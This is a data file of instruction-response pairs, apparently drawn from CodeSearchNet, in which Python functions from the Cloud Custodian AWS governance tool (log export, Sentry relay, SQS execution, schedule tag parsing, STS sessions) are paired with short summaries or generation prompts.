{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef status(config, group, accounts=(), region=None):\n    config = validate.callback(config)\n    destination = config.get('destination')\n    client = boto3.Session().client('s3')\n\n    for account in config.get('accounts', ()):\n        if accounts and account['name'] not in accounts:\n            continue\n\n        session = get_session(account['role'], region)\n        account_id = session.client('sts').get_caller_identity()['Account']\n        prefix = destination.get('prefix', '').rstrip('/') + '/%s' % account_id\n        prefix = \"%s/flow-log\" % prefix\n\n        role = account.pop('role')\n        if isinstance(role, six.string_types):\n            account['account_id'] = role.split(':')[4]\n        else:\n            account['account_id'] = role[-1].split(':')[4]\n\n        account.pop('groups')\n\n        try:\n            tag_set = client.get_object_tagging(\n                Bucket=destination['bucket'], Key=prefix).get('TagSet', [])\n        except ClientError:\n            account['export'] = 'missing'\n            continue\n        tags = {t['Key']: t['Value'] for t in tag_set}\n\n        if 'LastExport' not in tags:\n            account['export'] = 'empty'\n        else:\n            last_export = parse(tags['LastExport'])\n            account['export'] = last_export.strftime('%Y/%m/%d')\n\n    accounts = [a for a in config.get('accounts') if a in accounts or not accounts]\n    accounts.sort(key=operator.itemgetter('export'), reverse=True)\n    print(tabulate(accounts, headers='keys'))", "response": "report current export state status"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfinds exports for a given account", "response": "def get_exports(client, bucket, prefix, latest=True):\n    \"\"\"Find exports for a given account\n    \"\"\"\n    keys = client.list_objects_v2(\n        Bucket=bucket, Prefix=prefix, Delimiter='/').get('CommonPrefixes', [])\n    found = []\n    years = []\n    for y in keys:\n        part = y['Prefix'].rsplit('/', 2)[-2]\n        if not part.isdigit():\n            continue\n        year = int(part)\n        years.append(year)\n\n    if not years:\n        return []\n\n    years.sort(reverse=True)\n    if latest:\n        years = [years[0]]\n\n    for y in years:\n        keys = client.list_objects_v2(\n            Bucket=bucket, Prefix=\"%s/%d/\" % (prefix.strip('/'), y),\n            Delimiter='/').get('CommonPrefixes', [])\n        months = []\n        for m in keys:\n            part = m['Prefix'].rsplit('/', 2)[-2]\n            if not part.isdigit():\n                continue\n            month = int(part)\n            date_key = (y, month)\n            months.append(month)\n        months.sort(reverse=True)\n        if not months:\n            continue\n        if latest:\n            months = [months[0]]\n        for m in months:\n            keys = client.list_objects_v2(\n                Bucket=bucket, Prefix=\"%s/%d/%s/\" % (\n                    prefix.strip('/'), y, ('%d' % m).rjust(2, '0')),\n                Delimiter='/').get('CommonPrefixes', [])\n            for d in keys:\n                part = d['Prefix'].rsplit('/', 2)[-2]\n                if not part.isdigit():\n                    continue\n                day = int(part)\n                date_key = (y, m, day)\n                found.append(date_key)\n    found.sort(reverse=True)\n    if latest:\n        found = [found[0]]\n    return found"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nexports a given log group to s3", "response": "def export(group, bucket, prefix, start, end, role, poll_period=120,\n           session=None, name=\"\", region=None):\n    \"\"\"export a given log group to s3\"\"\"\n    start = start and isinstance(start, six.string_types) and parse(start) or start\n    end = (end and isinstance(start, six.string_types) and\n           parse(end) or end or datetime.now())\n    start = start.replace(tzinfo=tzlocal()).astimezone(tzutc())\n    end = end.replace(tzinfo=tzlocal()).astimezone(tzutc())\n\n    if session is None:\n        session = get_session(role, region)\n\n    client = session.client('logs')\n\n    paginator = client.get_paginator('describe_log_groups')\n    for p in paginator.paginate():\n        found = False\n        for _group in p['logGroups']:\n            if _group['logGroupName'] == group:\n                group = _group\n                found = True\n                break\n        if found:\n            break\n\n    if not found:\n        raise ValueError(\"Log group %s not found.\" % group)\n\n    if prefix:\n        prefix = \"%s/%s\" % (prefix.rstrip('/'), group['logGroupName'].strip('/'))\n    else:\n        prefix = group['logGroupName']\n\n    named_group = \"%s:%s\" % (name, group['logGroupName'])\n    log.info(\n        \"Log exporting group:%s start:%s end:%s bucket:%s prefix:%s size:%s\",\n        named_group,\n        start.strftime('%Y/%m/%d'),\n        end.strftime('%Y/%m/%d'),\n        bucket,\n        prefix,\n        group['storedBytes'])\n\n    t = time.time()\n    days = [(\n        start + timedelta(i)).replace(minute=0, hour=0, second=0, microsecond=0)\n        for i in range((end - start).days)]\n    day_count = len(days)\n    s3 = boto3.Session().client('s3')\n    days = filter_extant_exports(s3, bucket, prefix, days, start, end)\n\n    log.info(\"Group:%s filtering s3 extant keys from %d to %d start:%s end:%s\",\n             named_group, day_count, len(days),\n             days[0] if days else '', days[-1] if days else '')\n    t = time.time()\n\n    retry = get_retry(('SlowDown',))\n\n    for idx, d in enumerate(days):\n        date = d.replace(minute=0, microsecond=0, hour=0)\n        export_prefix = \"%s%s\" % (prefix, date.strftime(\"/%Y/%m/%d\"))\n        params = {\n            'taskName': \"%s-%s\" % (\"c7n-log-exporter\",\n                                   date.strftime(\"%Y-%m-%d\")),\n            'logGroupName': group['logGroupName'],\n            'fromTime': int(time.mktime(\n                date.replace(\n                    minute=0, microsecond=0, hour=0).timetuple()) * 1000),\n            'to': int(time.mktime(\n                date.replace(\n                    minute=59, hour=23, microsecond=0).timetuple()) * 1000),\n            'destination': bucket,\n            'destinationPrefix': export_prefix\n        }\n\n        # if stream_prefix:\n        #    params['logStreamPrefix'] = stream_prefix\n        try:\n            s3.head_object(Bucket=bucket, Key=prefix)\n        except ClientError as e:\n            if e.response['Error']['Code'] != '404':  # Not Found\n                raise\n            s3.put_object(\n                Bucket=bucket,\n                Key=prefix,\n                Body=json.dumps({}),\n                ACL=\"bucket-owner-full-control\",\n                ServerSideEncryption=\"AES256\")\n\n        t = time.time()\n        counter = 0\n        while True:\n            counter += 1\n            try:\n                result = client.create_export_task(**params)\n            except ClientError as e:\n                if e.response['Error']['Code'] == 'LimitExceededException':\n                    time.sleep(poll_period)\n                    # log every 30m of export waiting\n                    if counter % 6 == 0:\n                        log.debug(\n                            \"group:%s day:%s waiting for %0.2f minutes\",\n                            named_group, d.strftime('%Y-%m-%d'),\n                            (counter * poll_period) / 60.0)\n                    continue\n                raise\n            retry(\n                s3.put_object_tagging,\n                Bucket=bucket, Key=prefix,\n                Tagging={\n                    'TagSet': [{\n                        'Key': 'LastExport',\n                        'Value': d.isoformat()}]})\n            break\n\n        log.info(\n            \"Log export time:%0.2f group:%s day:%s bucket:%s prefix:%s task:%s\",\n            time.time() - t,\n            named_group,\n            d.strftime(\"%Y-%m-%d\"),\n            bucket,\n            params['destinationPrefix'],\n            result['taskId'])\n\n    log.info(\n        (\"Exported log group:%s time:%0.2f days:%d start:%s\"\n         \" end:%s bucket:%s prefix:%s\"),\n        named_group,\n        time.time() - t,\n        len(days),\n        start.strftime('%Y/%m/%d'),\n        end.strftime('%Y/%m/%d'),\n        bucket,\n        prefix)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nprocess a single log event and relay it to sentry", "response": "def process_log_event(event, context):\n    \"\"\"Lambda Entrypoint - Log Subscriber\n\n    Format log events and relay to sentry (direct or sqs)\n    \"\"\"\n    init()\n    # Grab the actual error log payload\n    serialized = event['awslogs'].pop('data')\n    data = json.loads(zlib.decompress(\n        base64.b64decode(serialized), 16 + zlib.MAX_WBITS))\n    msg = get_sentry_message(config, data)\n    if msg is None:\n        return\n    if config['sentry_dsn']:\n        # Deliver directly to sentry\n        send_sentry_message(config['sentry_dsn'], msg)\n    elif config['sentry_sqs']:\n        # Delivery indirectly via sqs\n        sqs.send_message(\n            QueueUrl=config['sentry_sqs'])"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nprocesses the log group and sends the messages to the Sentry server.", "response": "def process_log_group(config):\n    \"\"\"CLI - Replay / Index\n    \"\"\"\n\n    from c7n.credentials import SessionFactory\n    factory = SessionFactory(\n        config.region, config.profile, assume_role=config.role)\n    session = factory()\n    client = session.client('logs')\n\n    params = dict(logGroupName=config.log_group,\n                  filterPattern='Traceback', interleaved=True)\n    if config.log_streams:\n        params['logStreamNames'] = config.log_streams\n\n    if config.start:\n        params['startTime'] = int(time.mktime(\n            parse_date(config.start).replace(\n                hour=0, minute=0, second=0, microsecond=0).timetuple()) * 1000)\n    if config.end:\n        params['endTime'] = int(time.mktime(\n            parse_date(config.end).replace(\n                hour=0, minute=0, second=0, microsecond=0).timetuple()) * 1000)\n\n    settings = dict(account_id=config.account_id,\n                    account_name=config.account_name)\n    paginator = client.get_paginator('filter_log_events')\n\n    event_count = 0\n    log.debug(\"Querying log events with %s\", params)\n    for p in paginator.paginate(**params):\n        # log.debug(\"Searched streams\\n %s\", \", \".join(\n        #    [s['logStreamName'] for s in p['searchedLogStreams']]))\n        for e in p['events']:\n            event_count += 1\n            msg = get_sentry_message(\n                settings, {'logEvents': [e],\n                           'logStream': e['logStreamName'],\n                           'logGroup': config.log_group}, client)\n            if msg is None:\n                continue\n            send_sentry_message(config.sentry_dsn, msg)\n\n    if event_count > 0:\n        log.info(\"Processed %s %d error events\", config.account_name, event_count)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_traceback(msg, site_path=\"site-packages\", in_app_prefix=\"c7n\"):\n\n    data = {}\n    lines = list(filter(None, msg.split('\\n')))\n    data['frames'] = []\n    err_ctx = None\n\n    for l in lines[1:-1]:\n        l = l.strip() # noqa E741\n        if l.startswith('Traceback'):\n            continue\n        elif l.startswith('File'):\n            abs_path, lineno, function = l.split(',', 3)\n            abs_path = abs_path[abs_path.find('\"'):-1]\n            f_path = abs_path[abs_path.find(site_path) + len(site_path) + 1:]\n            module = f_path[:f_path.find('.')].replace('/', '.').strip('.')\n            lineno = int(lineno.strip().split()[1])\n            function = function.strip().split()[-1]\n            err_ctx = dict(lineno=lineno,\n                           abs_path=abs_path,\n                           function=function,\n                           filename=f_path,\n                           module=module)\n            if module.startswith(in_app_prefix):\n                err_ctx['in_app'] = True\n        elif err_ctx is not None:\n            err_ctx['context_line'] = l\n            data['frames'].append(err_ctx)\n            err_ctx = None\n\n    return lines[0], {\n        'type': lines[-1].strip().split(':')[0],\n        'value': lines[-1].strip().split(':', 1)[1].strip(),\n        'module': data['frames'][-1]['module'],\n        'stacktrace': data}", "response": "Extract a sentry traceback structure from a python formatted traceback string per python stdlib traceback. print_exc"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets a Lambda function provisioning.", "response": "def get_function(session_factory, name, handler, runtime, role,\n                 log_groups,\n                 project, account_name, account_id,\n                 sentry_dsn,\n                 pattern=\"Traceback\"):\n    \"\"\"Lambda function provisioning.\n\n    Self contained within the component, to allow for easier reuse.\n    \"\"\"\n    # Lazy import to avoid runtime dependency\n    from c7n.mu import (\n        LambdaFunction, PythonPackageArchive, CloudWatchLogSubscription)\n\n    config = dict(\n        name=name,\n        handler=handler,\n        runtime=runtime,\n        memory_size=512,\n        timeout=15,\n        role=role,\n        description='Custodian Sentry Relay',\n        events=[\n            CloudWatchLogSubscription(\n                session_factory, log_groups, pattern)])\n\n    archive = PythonPackageArchive('c7n_sentry')\n    archive.add_contents(\n        'config.json', json.dumps({\n            'project': project,\n            'account_name': account_name,\n            'account_id': account_id,\n            'sentry_dsn': sentry_dsn,\n        }))\n    archive.add_contents(\n        'handler.py',\n        'from c7n_sentry.c7nsentry import process_log_event'\n    )\n    archive.close()\n\n    return LambdaFunction(config, archive)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbreak an iterable into lists of size", "response": "def chunks(iterable, size=50):\n    \"\"\"Break an iterable into lists of size\"\"\"\n    batch = []\n    for n in iterable:\n        batch.append(n)\n        if len(batch) % size == 0:\n            yield batch\n            batch = []\n    if batch:\n        yield batch"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list_app_resources(\n        app, env, resources, cmdb, start, end, tz):\n    \"\"\"Analyze flow log records for application and generate metrics per period\"\"\"\n    logging.basicConfig(level=logging.INFO)\n    start, end = get_dates(start, end, tz)\n\n    all_resources = []\n    for rtype_name in resources:\n        rtype = Resource.get_type(rtype_name)\n        resources = rtype.get_resources(cmdb, start, end, app, env)\n        all_resources.extend(resources)\n    print(json.dumps(all_resources, indent=2))", "response": "Analyze flow log records for application and generate metrics per period"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nloading resources into resource database.", "response": "def load_resources(bucket, prefix, region, account_config, accounts,\n                   assume, start, end, resources, store, db, verbose, debug):\n    \"\"\"load resources into resource database.\"\"\"\n    logging.basicConfig(level=(verbose and logging.DEBUG or logging.INFO))\n    logging.getLogger('botocore').setLevel(logging.WARNING)\n    logging.getLogger('s3transfer').setLevel(logging.WARNING)\n    start = date_parse(start)\n    end = date_parse(end)\n\n    if not resources:\n        resources = ['NetworkInterface', 'Instance', 'LoadBalancer']\n\n    account_map = {}\n    data = yaml.safe_load(account_config.read())\n    for a in data.get('accounts', ()):\n        if accounts and (a['name'] in accounts or a['account_id'] in accounts):\n            account_map[a['account_id']] = a\n        elif not accounts:\n            account_map[a['account_id']] = a\n    account_ids = list(account_map)\n\n    executor = ProcessPoolExecutor\n    if debug:\n        from c7n.executor import MainThreadExecutor\n        MainThreadExecutor.c7n_async = False\n        executor = MainThreadExecutor\n\n    stats = Counter()\n    t = time.time()\n    with executor(max_workers=multiprocessing.cpu_count()) as w:\n        futures = {}\n        for a in account_ids:\n            for r in resources:\n                futures[w.submit(\n                    process_account_resources, a, bucket, prefix,\n                    region, store, start, end, r)] = (a, r)\n\n        indexer = RESOURCE_FILE_INDEXERS[r]\n        for f in as_completed(futures):\n            a, r = futures[f]\n            if f.exception():\n                log.error(\"account:%s error:%s\", a, f.exception())\n                continue\n            files, dl_stats = f.result()\n            idx_stats = indexer(db, resource_config_iter(files))\n            log.info(\n                \"loaded account:%s files:%d bytes:%s events:%d resources:%d idx-time:%d dl-time:%d\",\n                account_map[a]['name'], len(files),\n                human_size(dl_stats['DownloadSize'] + dl_stats['CacheSize']),\n                idx_stats['Records'],\n                idx_stats['RowCount'],\n                idx_stats['IndexTime'],\n                dl_stats['FetchTime'])\n            stats.update(dl_stats)\n            stats.update(idx_stats)\n    log.info(\"Loaded %d resources across %d accounts in %0.2f\",\n             stats['RowCount'], len(account_ids), time.time() - t)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef load_plugins(self):\n        try:\n            from pkg_resources import iter_entry_points\n        except ImportError:\n            return\n        for ep in iter_entry_points(group=\"custodian.%s\" % self.plugin_type):\n            f = ep.load()\n            f()", "response": "Load external plugins.\n\n        Custodian is intended to interact with internal and external systems\n        that are not suitable for embedding into the custodian code base."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsubmitting a function for serialized execution on sqs", "response": "def submit(self, func, *args, **kwargs):\n        \"\"\"Submit a function for serialized execution on sqs\n        \"\"\"\n        self.op_sequence += 1\n        self.sqs.send_message(\n            QueueUrl=self.map_queue,\n            MessageBody=utils.dumps({'args': args, 'kwargs': kwargs}),\n            MessageAttributes={\n                'sequence_id': {\n                    'StringValue': str(self.op_sequence),\n                    'DataType': 'Number'},\n                'op': {\n                    'StringValue': named(func),\n                    'DataType': 'String',\n                },\n                'ser': {\n                    'StringValue': 'json',\n                    'DataType': 'String'}}\n        )\n\n        self.futures[self.op_sequence] = f = SQSFuture(\n            self.op_sequence)\n        return f"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngather the results from the queue and set them as result of the next concurrent process.", "response": "def gather(self):\n        \"\"\"Fetch results from separate queue\n        \"\"\"\n        limit = self.op_sequence - self.op_sequence_start\n        results = MessageIterator(self.sqs, self.reduce_queue, limit)\n        for m in results:\n            # sequence_id from above\n            msg_id = int(m['MessageAttributes']['sequence_id']['StringValue'])\n            if (not msg_id > self.op_sequence_start or not msg_id <= self.op_sequence or\n            msg_id not in self.futures):\n                raise RuntimeError(\n                    \"Concurrent queue user from different \"\n                    \"process or previous results\")\n            f = self.futures[msg_id]\n            f.set_result(m)\n            results.ack(m)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nnormalizing tag format on ecs resources to match common aws format", "response": "def ecs_tag_normalize(resources):\n    \"\"\"normalize tag format on ecs resources to match common aws format.\"\"\"\n    for r in resources:\n        if 'tags' in r:\n            r['Tags'] = [{'Key': t['key'], 'Value': t['value']} for t in r['tags']]\n            r.pop('tags')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nretrieve ecs resources for serverless policies or related resources", "response": "def get_resources(self, ids, cache=True):\n        \"\"\"Retrieve ecs resources for serverless policies or related resources\n\n        Requires arns in new format.\n        https://docs.aws.amazon.com/AmazonECS/latest/userguide/ecs-resource-ids.html\n        \"\"\"\n        cluster_resources = {}\n        for i in ids:\n            _, ident = i.rsplit(':', 1)\n            parts = ident.split('/', 2)\n            if len(parts) != 3:\n                raise PolicyExecutionError(\"New format ecs arn required\")\n            cluster_resources.setdefault(parts[1], []).append(parts[2])\n\n        results = []\n        client = local_session(self.manager.session_factory).client('ecs')\n        for cid, resource_ids in cluster_resources.items():\n            results.extend(\n                self.process_cluster_resources(client, cid, resource_ids))\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nresource types used by the collection.", "response": "def resource_types(self):\n        \"\"\"resource types used by the collection.\"\"\"\n        rtypes = set()\n        for p in self.policies:\n            rtypes.add(p.resource_type)\n        return rtypes"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_metrics(self, start, end, period):\n        values = {}\n        default_dimensions = {\n            'Policy': self.policy.name, 'ResType': self.policy.resource_type,\n            'Scope': 'Policy'}\n\n        metrics = list(self.POLICY_METRICS)\n\n        # Support action, and filter custom metrics\n        for el in itertools.chain(\n                self.policy.resource_manager.actions,\n                self.policy.resource_manager.filters):\n            if el.metrics:\n                metrics.extend(el.metrics)\n\n        session = utils.local_session(self.policy.session_factory)\n        client = session.client('cloudwatch')\n\n        for m in metrics:\n            if isinstance(m, six.string_types):\n                dimensions = default_dimensions\n            else:\n                m, m_dimensions = m\n                dimensions = dict(default_dimensions)\n                dimensions.update(m_dimensions)\n            results = client.get_metric_statistics(\n                Namespace=DEFAULT_NAMESPACE,\n                Dimensions=[\n                    {'Name': k, 'Value': v} for k, v\n                    in dimensions.items()],\n                Statistics=['Sum', 'Average'],\n                StartTime=start,\n                EndTime=end,\n                Period=period,\n                MetricName=m)\n            values[m] = results['Datapoints']\n        return values", "response": "Retrieve any associated metrics for the policy."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef run(self, event, lambda_context):\n        from c7n.actions import EventAction\n\n        mode = self.policy.data.get('mode', {})\n        if not bool(mode.get(\"log\", True)):\n            root = logging.getLogger()\n            map(root.removeHandler, root.handlers[:])\n            root.handlers = [logging.NullHandler()]\n\n        resources = self.resolve_resources(event)\n        if not resources:\n            return resources\n        resources = self.policy.resource_manager.filter_resources(\n            resources, event)\n\n        if 'debug' in event:\n            self.policy.log.info(\"Filtered resources %d\" % len(resources))\n\n        if not resources:\n            self.policy.log.info(\n                \"policy: %s resources: %s no resources matched\" % (\n                    self.policy.name, self.policy.resource_type))\n            return\n\n        with self.policy.ctx:\n            self.policy.ctx.metrics.put_metric(\n                'ResourceCount', len(resources), 'Count', Scope=\"Policy\",\n                buffer=False)\n\n            if 'debug' in event:\n                self.policy.log.info(\n                    \"Invoking actions %s\", self.policy.resource_manager.actions)\n\n            self.policy._write_file(\n                'resources.json', utils.dumps(resources, indent=2))\n\n            for action in self.policy.resource_manager.actions:\n                self.policy.log.info(\n                    \"policy: %s invoking action: %s resources: %d\",\n                    self.policy.name, action.name, len(resources))\n                if isinstance(action, EventAction):\n                    results = action.process(resources, event)\n                else:\n                    results = action.process(resources)\n                self.policy._write_file(\n                    \"action-%s\" % action.name, utils.dumps(results))\n        return resources", "response": "Run policy in push mode against given event."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_variables(self, variables=None):\n        # Global policy variable expansion, we have to carry forward on\n        # various filter/action local vocabularies. Where possible defer\n        # by using a format string.\n        #\n        # See https://github.com/capitalone/cloud-custodian/issues/2330\n        if not variables:\n            variables = {}\n\n        if 'mode' in self.data:\n            if 'role' in self.data['mode'] and not self.data['mode']['role'].startswith(\"arn:aws\"):\n                self.data['mode']['role'] = \"arn:aws:iam::%s:role/%s\" % \\\n                                            (self.options.account_id, self.data['mode']['role'])\n\n        variables.update({\n            # standard runtime variables for interpolation\n            'account': '{account}',\n            'account_id': self.options.account_id,\n            'region': self.options.region,\n            # non-standard runtime variables from local filter/action vocabularies\n            #\n            # notify action\n            'policy': self.data,\n            'event': '{event}',\n            # mark for op action\n            'op': '{op}',\n            'action_date': '{action_date}',\n            # tag action pyformat-date handling\n            'now': utils.FormatDate(datetime.utcnow()),\n            # account increase limit action\n            'service': '{service}',\n            # s3 set logging action :-( see if we can revisit this one.\n            'bucket_region': '{bucket_region}',\n            'bucket_name': '{bucket_name}',\n            'source_bucket_name': '{source_bucket_name}',\n            'target_bucket_name': '{target_bucket_name}',\n            'target_prefix': '{target_prefix}',\n            'LoadBalancerName': '{LoadBalancerName}'\n        })\n        return variables", "response": "Get runtime variables for policy interpolation."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef expand_variables(self, variables):\n        # format string values returns a copy\n        updated = utils.format_string_values(self.data, **variables)\n\n        # Several keys should only be expanded at runtime, perserve them.\n        if 'member-role' in updated.get('mode', {}):\n            updated['mode']['member-role'] = self.data['mode']['member-role']\n\n        # Update ourselves in place\n        self.data = updated\n        # Reload filters/actions using updated data, we keep a reference\n        # for some compatiblity preservation work.\n        m = self.resource_manager\n        self.resource_manager = self.load_resource_manager()\n\n        # XXX: Compatiblity hack\n        # Preserve notify action subject lines which support\n        # embedded jinja2 as a passthrough to the mailer.\n        for old_a, new_a in zip(m.actions, self.resource_manager.actions):\n            if old_a.type == 'notify' and 'subject' in old_a.data:\n                new_a.data['subject'] = old_a.data['subject']", "response": "Expand variables in the policy data."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget permissions needed by this policy", "response": "def get_permissions(self):\n        \"\"\"get permissions needed by this policy\"\"\"\n        permissions = set()\n        permissions.update(self.resource_manager.get_permissions())\n        for f in self.resource_manager.filters:\n            permissions.update(f.get_permissions())\n        for a in self.resource_manager.actions:\n            permissions.update(a.get_permissions())\n        return permissions"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nhandling various client side errors when describing snapshots", "response": "def extract_bad_snapshot(e):\n        \"\"\"Handle various client side errors when describing snapshots\"\"\"\n        msg = e.response['Error']['Message']\n        error = e.response['Error']['Code']\n        e_snap_id = None\n        if error == 'InvalidSnapshot.NotFound':\n            e_snap_id = msg[msg.find(\"'\") + 1:msg.rfind(\"'\")]\n            log.warning(\"Snapshot not found %s\" % e_snap_id)\n        elif error == 'InvalidSnapshotID.Malformed':\n            e_snap_id = msg[msg.find('\"') + 1:msg.rfind('\"')]\n            log.warning(\"Snapshot id malformed %s\" % e_snap_id)\n        return e_snap_id"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef assumed_session(role_arn, session_name, session=None, region=None, external_id=None):\n    if session is None:\n        session = Session()\n\n    retry = get_retry(('Throttling',))\n\n    def refresh():\n\n        parameters = {\"RoleArn\": role_arn, \"RoleSessionName\": session_name}\n\n        if external_id is not None:\n            parameters['ExternalId'] = external_id\n\n        credentials = retry(\n            session.client('sts').assume_role, **parameters)['Credentials']\n        return dict(\n            access_key=credentials['AccessKeyId'],\n            secret_key=credentials['SecretAccessKey'],\n            token=credentials['SessionToken'],\n            # Silly that we basically stringify so it can be parsed again\n            expiry_time=credentials['Expiration'].isoformat())\n\n    session_credentials = RefreshableCredentials.create_from_metadata(\n        metadata=refresh(),\n        refresh_using=refresh,\n        method='sts-assume-role')\n\n    # so dirty.. it hurts, no clean way to set this outside of the\n    # internals poke. There's some work upstream on making this nicer\n    # but its pretty baroque as well with upstream support.\n    # https://github.com/boto/boto3/issues/443\n    # https://github.com/boto/botocore/issues/761\n\n    s = get_session()\n    s._credentials = session_credentials\n    if region is None:\n        region = s.get_config_variable('region') or 'us-east-1'\n    s.set_config_variable('region', region)\n    return Session(botocore_session=s)", "response": "This function returns a boto3. Session object with the credentials for the given role and session."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndo the resource tag schedule and policy match the current time?", "response": "def process_resource_schedule(self, i, value, time_type):\n        \"\"\"Does the resource tag schedule and policy match the current time.\"\"\"\n        rid = i[self.id_key]\n        # this is to normalize trailing semicolons which when done allows\n        # dateutil.parser.parse to process: value='off=(m-f,1);' properly.\n        # before this normalization, some cases would silently fail.\n        value = ';'.join(filter(None, value.split(';')))\n        if self.parser.has_resource_schedule(value, time_type):\n            schedule = self.parser.parse(value)\n        elif self.parser.keys_are_valid(value):\n            # respect timezone from tag\n            raw_data = self.parser.raw_data(value)\n            if 'tz' in raw_data:\n                schedule = dict(self.default_schedule)\n                schedule['tz'] = raw_data['tz']\n            else:\n                schedule = self.default_schedule\n        else:\n            schedule = None\n        if schedule is None:\n            log.warning(\n                \"Invalid schedule on resource:%s value:%s\", rid, value)\n            self.parse_errors.append((rid, value))\n            return False\n        tz = self.get_tz(schedule['tz'])\n        if not tz:\n            log.warning(\n                \"Could not resolve tz on resource:%s value:%s\", rid, value)\n            self.parse_errors.append((rid, value))\n            return False\n        now = datetime.datetime.now(tz).replace(\n            minute=0, second=0, microsecond=0)\n        now_str = now.strftime(\"%Y-%m-%d\")\n        if 'skip-days-from' in self.data:\n            values = ValuesFrom(self.data['skip-days-from'], self.manager)\n            self.skip_days = values.get_values()\n        else:\n            self.skip_days = self.data.get('skip-days', [])\n        if now_str in self.skip_days:\n            return False\n        return self.match(now, schedule)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the resource s tag value specifying its schedule.", "response": "def get_tag_value(self, i):\n        \"\"\"Get the resource's tag value specifying its schedule.\"\"\"\n        # Look for the tag, Normalize tag key and tag value\n        found = False\n        for t in i.get('Tags', ()):\n            if t['Key'].lower() == self.tag_key:\n                found = t['Value']\n                break\n        if found is False:\n            return False\n        # enforce utf8, or do translate tables via unicode ord mapping\n        value = found.lower().encode('utf8').decode('utf8')\n        # Some folks seem to be interpreting the docs quote marks as\n        # literal for values.\n        value = value.strip(\"'\").strip('\"')\n        return value"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef raw_data(tag_value):\n        data = {}\n        pieces = []\n        for p in tag_value.split(' '):\n            pieces.extend(p.split(';'))\n        # parse components\n        for piece in pieces:\n            kv = piece.split('=')\n            # components must by key=value\n            if not len(kv) == 2:\n                continue\n            key, value = kv\n            data[key] = value\n        return data", "response": "convert the tag value to a dictionary taking values as is\n\n        This method name and purpose are opaque... and not true."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef keys_are_valid(self, tag_value):\n        for key in ScheduleParser.raw_data(tag_value):\n            if key not in ('on', 'off', 'tz'):\n                return False\n        return True", "response": "test that provided tag keys are valid"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef resources_gc_prefix(options, policy_config, policy_collection):\n\n    # Classify policies by region\n    policy_regions = {}\n    for p in policy_collection:\n        if p.execution_mode == 'poll':\n            continue\n        policy_regions.setdefault(p.options.region, []).append(p)\n\n    regions = get_gc_regions(options.regions)\n    for r in regions:\n        region_gc(options, r, policy_config, policy_regions.get(r, []))", "response": "Garbage collect old custodian policies based on prefix."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting a boto3 session potentially cross account sts", "response": "def get_session(account_info):\n    \"\"\"Get a boto3 sesssion potentially cross account sts assumed\n\n    assumed sessions are automatically refreshed.\n    \"\"\"\n    s = getattr(CONN_CACHE, '%s-session' % account_info['name'], None)\n    if s is not None:\n        return s\n    if account_info.get('role'):\n        s = assumed_session(account_info['role'], SESSION_NAME)\n    else:\n        s = boto3.Session()\n    setattr(CONN_CACHE, '%s-session' % account_info['name'], s)\n    return s"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbulks invoke a function via queues ridge Uses internal implementation details of rq. ridge", "response": "def bulk_invoke(func, args, nargs):\n    \"\"\"Bulk invoke a function via queues\n\n    Uses internal implementation details of rq.\n    \"\"\"\n    # for comparison, simplest thing that works\n    # for i in nargs:\n    #    argv = list(args)\n    #    argv.append(i)\n    #    func.delay(*argv)\n\n    # some variances between cpy and pypy, sniff detect\n    for closure in func.delay.func_closure:\n        if getattr(closure.cell_contents, 'queue', None):\n            ctx = closure.cell_contents\n            break\n    q = Queue(ctx.queue, connection=connection)\n    argv = list(args)\n    argv.append(None)\n    job = Job.create(\n        func, args=argv, connection=connection,\n        description=\"bucket-%s\" % func.func_name,\n        origin=q.name, status=JobStatus.QUEUED, timeout=ctx.timeout,\n        result_ttl=0, ttl=ctx.ttl)\n\n    for n in chunks(nargs, 100):\n        job.created_at = datetime.utcnow()\n        with connection.pipeline() as pipe:\n            for s in n:\n                argv[-1] = s\n                job._id = unicode(uuid4())\n                job.args = argv\n                q.enqueue_job(job, pipeline=pipe)\n            pipe.execute()"}
